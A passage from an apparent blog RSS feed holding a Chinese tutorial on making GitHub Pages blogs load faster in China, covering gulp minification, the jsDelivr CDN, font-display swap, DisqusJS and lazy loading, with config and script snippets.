<p>在github actions将page专用分支更新后，zeit\netlify\github pages三个平台都会自动将最新的内容部署上，这样我就只需要关注博客内容，后续操作都不需要管了</p>
</blockquote>
]]></description></item><item><title>加快Github Pages国内访问速度</title><link>https://lgf.im/posts/coding/speedup-github-page/</link><pubDate>Thu, 19 Mar 2020 17:17:53 +0000</pubDate><author/><guid>https://lgf.im/posts/coding/speedup-github-page/</guid><description><![CDATA[<h2 id="前言">前言</h2>
<p>相信不少小伙伴都在使用 Github Pages 提供的免费静态网站托管来搭建自己的博客，但是因为墙的存在和特殊国情，使用 Github Pages 搭建的网站速度普遍不快，因此很多小伙伴只能转战国内付费的服务器和 CDN。</p>
<p>正巧我也在使用 Github Pages 搭建自己的静态博客，正好来说一下我的优化方法。</p>
<h2 id="压缩">压缩</h2>
<p>默认情况下，如果我们查看 Hexo 生成的静态网页源代码，会发现存在大量的空格、空行、注释等无用内容。同样的，如果使用的 hexo 主题没有进行优化，大量的 css 和 js 文件也存在这样的垃圾内容。</p>
<p>如果你在一些大型网站右键查看网页源代码，你会发现他们的 html\js\css 是经过压缩处理的，没有多余的换行和注释，这势必会节省带宽流量和传输时间，提升用户体验。</p>
<p>所以我们优化速度的第一关就是对 Hexo 生成的代码进行压缩。</p>
<p>这里我使用的工具是 gulp</p>
<h3 id="安装-gulp">安装 gulp</h3>
<p>在自己本机安装</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install gulp -g
</code></pre></td></tr></table>
</div>
</div><p>为了 Github Action 或其他 CI\CD 平台也能够进行安装，这里推荐</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install gulp --save-dev
</code></pre></td></tr></table>
</div>
</div><p>我们还需要一些依赖</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install --save-dev <span class="se">\
</span><span class="se"></span>            gulp-minify-css <span class="se">\
</span><span class="se"></span>            gulp-babel <span class="se">\
</span><span class="se"></span>            gulp-uglify <span class="se">\
</span><span class="se"></span>            gulp-htmlmin <span class="se">\
</span><span class="se"></span>            gulp-htmlclean <span class="se">\
</span><span class="se"></span>            gulp-imagemin <span class="se">\
</span><span class="se"></span>            imagemin-jpegtran <span class="se">\
</span><span class="se"></span>            imagemin-svgo <span class="se">\
</span><span class="se"></span>            imagemin-gifsicle <span class="se">\
</span><span class="se"></span>            imagemin-optipng
</code></pre></td></tr></table>
</div>
</div><h3 id="创建配置文件">创建配置文件</h3>
<p>在博客 hexo 的根目录下，新建 <code>gulpfile.js</code> 配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">gulp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">minifycss</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-minify-css&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">uglify</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-uglify&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">htmlmin</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-htmlmin&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">htmlclean</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-htmlclean&#34;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">imagemin</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;gulp-imagemin&#34;</span><span class="p">);</span>

<span class="c1">// 压缩css文件
</span><span class="c1"></span><span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span><span class="s2">&#34;minify-css&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">gulp</span>
    <span class="p">.</span><span class="nx">src</span><span class="p">(</span><span class="s2">&#34;./public/**/*.css&#34;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">minifycss</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">gulp</span><span class="p">.</span><span class="nx">dest</span><span class="p">(</span><span class="s2">&#34;./public&#34;</span><span class="p">));</span>
<span class="p">});</span>

<span class="c1">// 压缩html
</span><span class="c1"></span><span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span><span class="s2">&#34;minify-html&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">gulp</span>
    <span class="p">.</span><span class="nx">src</span><span class="p">(</span><span class="s2">&#34;./public/**/*.html&#34;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">htmlclean</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span>
      <span class="nx">htmlmin</span><span class="p">({</span>
        <span class="nx">collapseWhitespace</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">collapseBooleanAttributes</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">removeComments</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">removeEmptyAttributes</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">removeScriptTypeAttributes</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">removeStyleLinkTypeAttributes</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">minifyJS</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">minifyCSS</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">minifyURLs</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="nx">ignoreCustomFragments</span><span class="o">:</span> <span class="p">[</span><span class="sr">/\{\{[\s\S]*?\}\}/</span><span class="p">],</span>
      <span class="p">})</span>
    <span class="p">)</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">gulp</span><span class="p">.</span><span class="nx">dest</span><span class="p">(</span><span class="s2">&#34;./public&#34;</span><span class="p">));</span>
<span class="p">});</span>

<span class="c1">// 压缩js文件
</span><span class="c1"></span><span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span><span class="s2">&#34;minify-js&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">gulp</span>
    <span class="p">.</span><span class="nx">src</span><span class="p">([</span><span class="s2">&#34;./public/**/*.js&#34;</span><span class="p">,</span> <span class="s2">&#34;!./public/js/**/*min.js&#34;</span><span class="p">])</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">uglify</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">gulp</span><span class="p">.</span><span class="nx">dest</span><span class="p">(</span><span class="s2">&#34;./public&#34;</span><span class="p">));</span>
<span class="p">});</span>

<span class="c1">// 压缩图片
</span><span class="c1"></span><span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span><span class="s2">&#34;minify-images&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">gulp</span>
    <span class="p">.</span><span class="nx">src</span><span class="p">([</span>
      <span class="s2">&#34;./public/**/*.png&#34;</span><span class="p">,</span>
      <span class="s2">&#34;./public/**/*.jpg&#34;</span><span class="p">,</span>
      <span class="s2">&#34;./public/**/*.gif&#34;</span><span class="p">,</span>
      <span class="s2">&#34;./public/**/*.svg&#34;</span><span class="p">,</span>
    <span class="p">])</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span>
      <span class="nx">imagemin</span><span class="p">([</span>
        <span class="nx">imagemin</span><span class="p">.</span><span class="nx">gifsicle</span><span class="p">({</span> <span class="nx">interlaced</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}),</span>
        <span class="nx">imagemin</span><span class="p">.</span><span class="nx">mozjpeg</span><span class="p">({</span> <span class="nx">quality</span><span class="o">:</span> <span class="mi">75</span><span class="p">,</span> <span class="nx">progressive</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}),</span>
        <span class="nx">imagemin</span><span class="p">.</span><span class="nx">optipng</span><span class="p">({</span> <span class="nx">optimizationLevel</span><span class="o">:</span> <span class="mi">5</span> <span class="p">}),</span>
        <span class="nx">imagemin</span><span class="p">.</span><span class="nx">svgo</span><span class="p">({</span>
          <span class="nx">plugins</span><span class="o">:</span> <span class="p">[{</span> <span class="nx">removeViewBox</span><span class="o">:</span> <span class="kc">true</span> <span class="p">},</span> <span class="p">{</span> <span class="nx">cleanupIDs</span><span class="o">:</span> <span class="kc">false</span> <span class="p">}],</span>
        <span class="p">}),</span>
      <span class="p">])</span>
    <span class="p">)</span>
    <span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">gulp</span><span class="p">.</span><span class="nx">dest</span><span class="p">(</span><span class="s2">&#34;./public&#34;</span><span class="p">));</span>
<span class="p">});</span>

<span class="nx">gulp</span><span class="p">.</span><span class="nx">task</span><span class="p">(</span>
  <span class="s2">&#34;default&#34;</span><span class="p">,</span>
  <span class="nx">gulp</span><span class="p">.</span><span class="nx">series</span><span class="p">(</span>
    <span class="nx">gulp</span><span class="p">.</span><span class="nx">parallel</span><span class="p">(</span><span class="s2">&#34;minify-html&#34;</span><span class="p">,</span> <span class="s2">&#34;minify-css&#34;</span><span class="p">,</span> <span class="s2">&#34;minify-js&#34;</span><span class="p">,</span> <span class="s2">&#34;minify-images&#34;</span><span class="p">)</span>
  <span class="p">)</span>
<span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用方法">使用方法</h3>
<p>在使用 <code>hexo g</code> 生成静态网站后， 运行 <code>gulp</code> 进行压缩</p>
<h2 id="使用-cdn">使用 CDN</h2>
<p>如果你查看博客的网络请求内容，你会发现在 html 加载之后，还有一堆小文件等待加载，而这些 css\js\图片文件的加载占据了大部分的网页打开时间。</p>
<p>因为 Github Pages 的延迟巨大，速度极慢，我们更有必要使用国内的 CDN 对这些资源进行分发。</p>
<p>不想使用国内付费的 CDN 服务，我尝试过使用 CloudFlare 进行加速（实质减速）效果不佳，后来发现了 jsDelivr。</p>
<p>jsDelivr 是一家开源免费 CDN，主要是对 npm 包进行 CDN 分发</p>
<p>绝妙的是它还能对 Github 和 Wordpress 进行 CDN 分发</p>
<p>我们可以借助 jsDelivr 的 Github 资源分发 服务来对我们博客中的 css\js\小图片进行加速</p>
<blockquote>
<p>这是我目前找到的唯一一家在国内有节点并且不需要备案的 CDN 分发服务</p>
</blockquote>
<p>这里我就以我使用的主题为例，分享一下我如何使用 jsDelivr 进行 CDN 分发</p>
<h3 id="链接格式">链接格式</h3>
<p>jsDelivr 针对 Github 资源有众多 URL 格式</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">https://cdn.jsdelivr.net/gh/user/repo@version/file
https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery/dist/jquery.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/src/core.min.js
https://cdn.jsdelivr.net/gh/jquery/jquery/
</code></pre></td></tr></table>
</div>
</div><p>考虑到 jsDelivr 默认缓存时间是 7 天，如果我们想要修改实时生效而不需要等到缓存过期，最适合的是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js

https://cdn.jsdelivr.net/gh/ github用户名 / 库名 @ 版本号或者tag / 路径/文件名
</code></pre></td></tr></table>
</div>
</div><p>我们可以通过打 tag 来访问同一个资源文件的不同版本，而不需要考虑缓存时间</p>
<h3 id="替换链接">替换链接</h3>
<p>大部分 hexo 主题并不会对使用到的 js\css\图片\字体 套上 CDN，我们来手动替换</p>
<h4 id="css-样式表">css 样式表</h4>
<p>大部分 css 样式会在 <code>head</code> 标签里面引入，这里的 css 样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意</p>
<p>我将我使用的主题的 style.css \ rtl.css \ disquesjs.css 替换成 jsDelivr，明显提升了等待时间</p>
<p></p>
<p>还有一些其他地方的 css 引入</p>
<p></p>
<h4 id="js-脚本">js 脚本</h4>
<p>寻找并替换各种调用到的 js 脚本</p>
<p></p>
<p>main.js</p>
<p></p>
<p>disqusjs.js</p>
<p></p>
<p>还有其他的一些地方，不一一列举了</p>
<h4 id="字体">字体</h4>
<p>字体需要特别注意，通常情况下比较大，耗时比较长</p>
<p></p>
<p>我使用的主题使用的字体通过 <code>all.min.css</code> 引入，因为前面这个 css 样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过 jsDelivr 引入了</p>
<h4 id="img-小图片">img 小图片</h4>
<p>一般是 logo 等资源，根据主题自行替换</p>
<blockquote>
<p>更新：为了更好的控制版本和决定是否使用 jsDelivr, 可以将这个地方独立出来放到配置文件里</p>
</blockquote>
<p>_config.yml</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">cdn</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="w">  </span><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l">https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>用到的地方</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!-- styles --&gt;
&lt;% if (theme.cdn.enabled) { %&gt;
  &lt;link rel=&#34;stylesheet&#34; href=&#34;&lt;%= theme.cdn.url %&gt;/css/style.css&#34;&gt;
&lt;% } else { %&gt;
  &lt;%- css(&#39;css/style&#39;) %&gt;
&lt;% } %&gt;

其他的地方同样的方法
</code></pre></td></tr></table>
</div>
</div><h2 id="加载时文字可见">加载时文字可见</h2>
<p>无论怎样优化，字体加载的时间无法忽略，这段时间的网页文字显示为空，这给用户带来卡顿感</p>
<p>我们必须使字体加载时文字可见，这样才能弥补 github pages 的慢</p>
<p>具体方法是将各 <code>@font-face</code> 中 <code>font-display</code> 设置为 <code>swap</code>, 这样可以在字体未加载完时临时使用系统字体替代，加载完后重新渲染字体</p>
<p></p>
<p>每一个地方都需要改，自己搜索吧</p>
<h2 id="使用-disqusjs">使用 DisqusJS</h2>
<p>由于众所周知的原因，disqus 被墙了，国内访问不了，而大部分 hexo 网站都使用 disqus 作为评论系统，这导致网页会卡在评论区的加载上，虽然网页已经加载完了，但进度条还在进行，给用户带来慢的感觉。</p>
<p>并且，即使有的用户翻墙能够访问 Disqus，但 Disqus 本身非常笨重，各种 CSS/JS/Font/API 加起来请求不小于 2MB，当 Disqus 加载时，浏览器会在主线程中同步解析、渲染 Disqus，造成卡顿感。</p>
<p>在上网搜索之后，找到了一个替代方案，那就是苏卡卡大佬的 DisqusJS，大家可以根据教程对自己博客的主题进行修改</p>
<p>参考链接：</p>
<ul>
<li><a href="https://blog.skk.moe/post/disqusjs/">https://blog.skk.moe/post/disqusjs/</a></li>
<li><a href="https://disqusjs.skk.moe/">https://disqusjs.skk.moe/</a></li>
<li><a href="https://github.com/SukkaW/DisqusJS">https://github.com/SukkaW/DisqusJS</a></li>
</ul>
<p>对于使用的 Disqus API 反代，我自己测试发现苏卡卡大佬提供的速度不太行，不知道是什么原因，所以推荐自己进行搭建，我是用的是 zeit 进行搭建，感觉还不错</p>
<blockquote>
<p>如果 disqusJS 默认样式不适合自己的主题，推荐 fork 原库进行修改，注意要使用 1.2.6，最新的 master 在懒加载上有点问题</p>
</blockquote>
<h2 id="使用懒加载">使用懒加载</h2>
<p>如果图片和评论区随着页面在一开始就加载，势必会拖累网页首次渲染和文字的迅速显示，这里最好的办法是使用懒加载技术</p>
<h3 id="图片懒加载">图片懒加载</h3>
<p>对于图片，我使用了 <code>hexo-lazyload-image</code> 这个插件</p>
<p>安装</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install hexo-lazyload-image --save
</code></pre></td></tr></table>
</div>
</div><p>配置文件中添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">lazyload:
  enable: <span class="nb">true</span>
  onlypost: <span class="nb">false</span>
  loadingImg: https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2/images/loading.png
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>顺便给懒加载添加了 cdn 功能，可以替换成 cdn 链接来加速</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">npm install hexo-lazyload-image-cdn --save
</code></pre></td></tr></table>
</div>
</div><p>配置文件中添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">lazyload:
  enable: <span class="nb">true</span>
  onlypost: <span class="nb">false</span>
  loadingImg: <span class="c1"># eg ./images/loading.gif</span>
  cdn:
    enabled: <span class="nb">false</span>
    url: https://cdn.com
</code></pre></td></tr></table>
</div>
</div><h3 id="评论懒加载">评论懒加载</h3>
<p>对于评论区，很多情况下用户根本不会划到页面底部（文章写得太烂没人看得下去）。</p>
<p>所以我这里对 disqus 的加载使用懒加载技术，参考 <a href="https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/">https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/</a></p>
<p>我使用的是 disqusJS, 下面给出加载的 js 代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c">&lt;!--</span> <span class="nx">DisqusJS</span> <span class="nx">Comments</span> <span class="o">--&gt;</span>
<span class="o">&lt;%</span> <span class="k">if</span> <span class="p">(</span><span class="nx">theme</span><span class="p">.</span><span class="nx">disqusjs</span><span class="p">.</span><span class="nx">enabled</span> <span class="o">&amp;&amp;</span> <span class="nx">theme</span><span class="p">.</span><span class="nx">disqusjs</span><span class="p">.</span><span class="nx">shortname</span><span class="p">){</span> <span class="o">%&gt;</span>
  <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">crossorigin</span> <span class="nx">defer</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;https://cdn.jsdelivr.net/gh/zu1k/DisqusJS@1.2.6.3/dist/disqus.js&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;disqusjs-script&#34;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
  <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;disqusjs-script&#34;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="nx">setTimeout</span><span class="p">(</span>
        <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
          <span class="kd">function</span> <span class="nx">t</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">dsqjs</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DisqusJS</span><span class="p">({</span>
                  <span class="nx">shortname</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.shortname %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">siteName</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.siteName %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">api</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.api %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">apikey</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.apikey %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">admin</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.admin %&gt;&#39;</span><span class="p">,</span>
                  <span class="nx">adminLabel</span><span class="o">:</span> <span class="s1">&#39;&lt;%= theme.disqusjs.adminLabel %&gt;&#39;</span>
              <span class="p">});</span>
          <span class="p">}</span>
          <span class="kd">var</span> <span class="nx">runningOnBrowser</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nb">window</span> <span class="o">!==</span> <span class="s2">&#34;undefined&#34;</span><span class="p">;</span>
          <span class="kd">var</span> <span class="nx">isBot</span> <span class="o">=</span> <span class="nx">runningOnBrowser</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="s2">&#34;onscroll&#34;</span> <span class="k">in</span> <span class="nb">window</span><span class="p">)</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">navigator</span> <span class="o">!==</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">&amp;&amp;</span> <span class="sr">/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">);</span>
          <span class="kd">var</span> <span class="nx">supportsIntersectionObserver</span> <span class="o">=</span> <span class="nx">runningOnBrowser</span> <span class="o">&amp;&amp;</span> <span class="s2">&#34;IntersectionObserver&#34;</span> <span class="k">in</span> <span class="nb">window</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isBot</span> <span class="o">&amp;&amp;</span> <span class="nx">supportsIntersectionObserver</span><span class="p">)</span> <span class="p">{</span>
              <span class="kd">var</span> <span class="nx">disqus_observer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">IntersectionObserver</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">entries</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">entries</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">isIntersecting</span><span class="p">)</span> <span class="p">{</span>
                  <span class="nx">t</span><span class="p">();</span>
                  <span class="nx">disqus_observer</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
                <span class="p">}</span>
              <span class="p">},</span> <span class="p">{</span> <span class="nx">threshold</span><span class="o">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">});</span>
              <span class="nx">disqus_observer</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;disqus_thread&#39;</span><span class="p">));</span>
          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">t</span><span class="p">();</span>
          <span class="p">}</span>
      <span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">},</span><span class="o">!</span><span class="mi">0</span>
  <span class="p">);</span>
  <span class="o">&lt;</span><span class="err">/script&gt;</span>
<span class="o">&lt;%</span> <span class="p">}</span> <span class="o">%&gt;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="终极大招">终极大招</h2>
<p>如果经过上面的优化，你还对博客的加载速度不满意，那一定是 github pages 服务器在美国的原因，200+ms 的延迟导致首字节返回时间不短</p>
<p>其实支持通过 Github 仓库代码进行构建，部署为静态网站的平台不值 github pages 一家，我使用过的比较好的是 <code>zeit.co</code> ， 国内访问走的是台湾的 gcp 节点，延迟低速度快，推荐</p>
<p>具体使用方法非常简单，自行摸索吧</p>
<blockquote>
<p>更新: 刚知道，如果更新太快的话，zeit 会暂停构建部署的</p>
<p>You are pushing commits at a very fast pace (across the whole organization).<br>
Due to that, we cannot deploy the commit e80751b.</p>
<p>You can try again later or upgrade your plan.</p>
</blockquote>
<h2 id="辅助优化">辅助优化</h2>
<p>使用谷歌提供的 <a href="https://developers.google.com/speed/pagespeed/insights/" target="_blank" rel="noopener noreffer">Pagespeed Insights</a> 工具分析网页加载并根据建议进行优化</p>
